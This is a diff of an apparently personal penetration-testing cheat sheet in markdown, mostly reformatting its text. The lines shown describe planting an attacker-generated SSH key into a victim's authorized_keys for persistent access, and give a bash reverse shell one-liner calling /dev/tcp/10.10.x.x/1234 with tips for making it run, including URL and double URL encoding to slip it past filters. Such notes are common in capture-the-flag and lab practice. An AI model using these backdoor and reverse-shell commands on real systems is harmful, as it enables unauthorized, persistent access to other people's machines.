@@ -29,11 +29,10 @@ $ mkdir ".ssh"; cd .ssh ; touch authorized_keys
 # On the attacker machine
 
 $ cd /tmp; ssh-keygen  
-
-# Generating public/private rsa key pair.
-Enter file in which to save the key (/home/o54ma/.ssh/id_rsa): TmpKey # file name to save the key 
-Enter passphrase (empty for no passphrase): 						  # no password 
-Enter same passphrase again: 								          # no password 
+    # Generating public/private rsa key pair.
+    Enter file in which to save the key (/home/o54ma/.ssh/id_rsa): TmpKey # file name to save the key 
+    Enter passphrase (empty for no passphrase): 						  # no password 
+    Enter same passphrase again: 								          # no password 
 
 
 $ cat TmpKey.pub | xclip -selection c                                 # copy the public key
@@ -41,15 +40,15 @@ $ cat TmpKey.pub | xclip -selection c                                 # copy the
 ```
 
 ```bash
-# Back on the victim machine
+# Back to the victim side
 
 $ echo "`CTRL+V`" >> authorized_keys
 ```
 
 ```bash
-# Back on the attacker machine
+# Back to the attacker side
 
-ssh -i TmpKey Username@Host
+$ ssh -i TmpKey Username@Host
 ```
 
 
@@ -68,12 +67,13 @@ not recommended ^^ :soon:
 ```note
 some times the shell doesn't work, why ?? 
 
-* if it is a bash reverse shell, e.g. ```bash bash -i >& /dev/tcp/10.10.x.x/1234 0>&1``` , try precede it with `bash -c` 
+* if it is a bash reverse shell, e.g. <span style="font-family:monospace;> bash -i >& /dev/tcp/10.10.x.x/1234 0>&1 </span>, try precede it with `bash -c` 
+
 
 * try URL encoding / double URL encoding
 
-* quotations conflict, how to deal with it ?? 
 
+* quotations conflict, how to deal with it ??
     * embrace the whole payload with double qoutes, then escape the inside ones
     
     * there is also some tools that ask you to pass the payload as an argv, so make sure how they gonna receive it (inside a double or a single qoutes ??)
